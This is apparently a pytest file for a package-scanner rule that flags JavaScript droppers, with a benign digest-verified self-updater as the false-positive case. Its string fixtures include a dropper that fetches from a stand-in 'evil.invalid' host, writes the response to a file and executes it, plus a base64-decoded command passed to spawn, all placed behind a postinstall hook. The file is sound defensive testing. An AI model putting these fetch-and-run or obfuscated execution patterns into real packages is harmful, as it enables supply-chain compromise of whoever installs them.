"""Written-then-run droppers (review 98 round 2 B).

A response fetched in JavaScript, written to a file and then run from disk is
`SUSPECT.DROPPER.REMOTE_CODE.001`: the written path carries `network_response`, so executing it
(`execSync`, `require`) is network_response -> process/execute.

A verified binary self-updater is NOT that shape and must not fire: it writes the download to a
temporary file, checks it against a shipped digest, renames it and spawns the binary. The run
target is the renamed path, not the one written, so the taint does not reach the spawn -- the
dimainator case (`dimainator-2.11.0`, a review-98 benign false positive that round 1's broader
written-then-run tripped). Every fixture here is inert text scanned in a tarball; none is run, and
hosts are `.invalid` or documentation addresses.
"""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

from cordon_scanner import Scanner

REMOTE_CODE = "SUSPECT.DROPPER.REMOTE_CODE.001"

#: fetch an arbitrary host, write the response, run it with node -- a dropper.
RUN_FETCHED = (
    'const fs = require("fs");\n'
    'const cp = require("child_process");\n'
    'const path = require("path");\n'
    'const os = require("os");\n'
    "async function go() {\n"
    '  const r = await fetch("https://evil.invalid/payload");\n'
    '  const p = path.join(os.tmpdir(), "x.js");\n'
    "  fs.writeFileSync(p, await r.text());\n"
    '  cp.execSync("node " + p);\n'
    "}\n"
    "go();\n"
)

#: the dimainator shape: write to a temp, verify a shipped digest, rename, spawn the binary.
VERIFIED_BINARY = (
    'const { createHash } = require("node:crypto");\n'
    'const { spawn } = require("node:child_process");\n'
    'const { writeFile, rename } = require("node:fs/promises");\n'
    "async function go() {\n"
    '  const exe = "/tmp/tool";\n'
    '  const temporary = exe + ".download";\n'
    '  const res = await fetch("https://github.com/example-owner/tool/releases/download/v1/tool");\n'
    "  const data = Buffer.from(await res.arrayBuffer());\n"
    '  const digest = "0".repeat(64);\n'
    '  if (createHash("sha256").update(data).digest("hex") !== digest) throw new Error("bad digest");\n'
    "  await writeFile(temporary, data);\n"
    "  await rename(temporary, exe);\n"
    "  spawn(exe, []);\n"
    "}\n"
    "go();\n"
)


#: shape A (review 98, rollup-plugins-polyfills-rode): a base64 blob decoded, split into a command
#: and run, and another decoded into a module name and required. The decoded label is followed
#: through `.toString`, `.split` and the `[cmd, ...args]` destructuring, so the run is a dataflow
#: fact. The b64 here is inert ("echo hi", "foo").
DECODED_RUN = (
    'const { spawn } = require("child_process");\n'
    'const CMD = Buffer.from("ZWNobyBoaQ==", "base64").toString("utf8");\n'
    'const [cmd, ...args] = CMD.split(" ");\n'
    'spawn(cmd, args, { stdio: "ignore" });\n'
    'const MODULE_NAME = Buffer.from("Zm9v", "base64").toString("utf8");\n'
    "require(MODULE_NAME);\n"
)


class TestWrittenThenRun:
    @staticmethod
    def _scan(tmp_path: Path, install: str, name: str = "example-pkg") -> list[tuple[str, str]]:
        manifest = {
            "name": name,
            "version": "1.0.0",
            "scripts": {"postinstall": "node install.js"},
        }
        members = {
            "package/package.json": json.dumps(manifest).encode(),
            "package/install.js": install.encode(),
        }
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for member, data in members.items():
                info = tarfile.TarInfo(member)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / f"{name}-1.0.0.tgz"
        target.write_bytes(buffer.getvalue())
        return [(f.rule_id, str(f.severity)) for f in Scanner().scan(target).findings]

    def test_a_fetched_file_run_from_disk_is_remote_code(self, tmp_path: Path) -> None:
        found = self._scan(tmp_path, RUN_FETCHED)
        remote = [(r, s) for r, s in found if r == REMOTE_CODE]
        assert remote, found
        # From an arbitrary host with no digest, it stays a block (critical).
        assert all(s == "critical" for _, s in remote)

    def test_a_verified_binary_self_updater_does_not_fire(self, tmp_path: Path) -> None:
        found = self._scan(tmp_path, VERIFIED_BINARY)
        assert not [r for r, _ in found if r == REMOTE_CODE], found

    def test_a_decoded_command_run_is_remote_code(self, tmp_path: Path) -> None:
        # The decoded value reaches spawn and require; the `decoded` source makes that a
        # REMOTE_CODE flow, caught without the written-to-disk step.
        found = self._scan(tmp_path, DECODED_RUN)
        assert [r for r, _ in found if r == REMOTE_CODE], found


class TestACommandAPersonRuns:
    """The same fetch-and-run, from a `bin` command and from the package's `main`."""

    @staticmethod
    def _scan(tmp_path: Path, manifest_extra: dict[str, object], path: str) -> set[str]:
        manifest = {"name": "example-cli", "version": "1.0.0", **manifest_extra}
        members = {
            "package/package.json": json.dumps(manifest).encode(),
            f"package/{path}": RUN_FETCHED.encode(),
        }
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for member, data in members.items():
                info = tarfile.TarInfo(member)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / "example-cli-1.0.0.tgz"
        target.write_bytes(buffer.getvalue())
        return {
            str(f.severity) for f in Scanner().scan(target).findings if f.rule_id == REMOTE_CODE
        }

    def test_in_a_command_a_person_runs_it_is_reported_below_the_gate(self, tmp_path: Path) -> None:
        assert self._scan(tmp_path, {"bin": {"example": "bin/cli.js"}}, "bin/cli.js") == {"medium"}

    def test_in_the_entry_every_importer_runs_it_still_blocks(self, tmp_path: Path) -> None:
        severities = self._scan(tmp_path, {"main": "index.js"}, "index.js")
        assert severities
        assert severities <= {"high", "critical"}
